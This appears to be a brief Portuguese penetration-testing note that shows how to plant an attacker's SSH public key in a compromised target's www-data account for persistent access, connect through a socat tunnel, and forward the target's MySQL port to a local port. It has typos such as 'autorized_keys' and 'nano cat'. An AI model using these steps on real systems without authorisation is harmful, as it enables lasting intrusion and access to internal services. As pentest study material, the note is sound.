# SSH

ALVO ==>> cat ~/.ssh/authorized_keys
LOCAL ==>> ssh-keygen
LOCAL ==>> cat id_rsa.pub (Copiar)
ALVO ==>> nano cat ~/.ssh/authorized_keys (Colar sua chave pública)
LOCAL ==>> ssh-add
LOCAL ==>> Conectar no alvo via SSH.

---

LOCAL ==>> ```bash
ssh-keygen -P "" -f keys
```
*Será gerado as chaves públicas e privadas.*

LOCAL ==>> ```bash
cat keys.pub *Copie a chave*
```
*Copie a chave pública para inserirmos no alvo.*

ALVO ==>> ```bash
mkdir ~www-data/.ssh/
```
*Cria uma pasta de ssh para o usuário www-data.*

ALVO ==>> ```bash
echo "**Cole a chave aqui**" >> ~/.ssh/autorized_keys
```
*Cria uma chave autorizada no servidor.*

LOCAL ==>> ```bash
ssh www-data@127.0.0.1 -p 2222 -i keys
```
*No comando acima estamos passando o usuário www-data e estamos utilizando o tunelamento, caso tenha dúvidas aconselho consultar o socat. Então é feito a conexão na porta local 2222 que será tunelada e passamos a chave privada keys gerada anteriormente para conectar.*

Criando redirecionamento através do SSH:
```bash
ssh www-data@127.0.0.1 -p 2222 -i keys -L 3333:127.0.0.1:3306
```
*Nesse comando a porta 3306 do alvo está sendo redirecionada para a porta local 3333.*
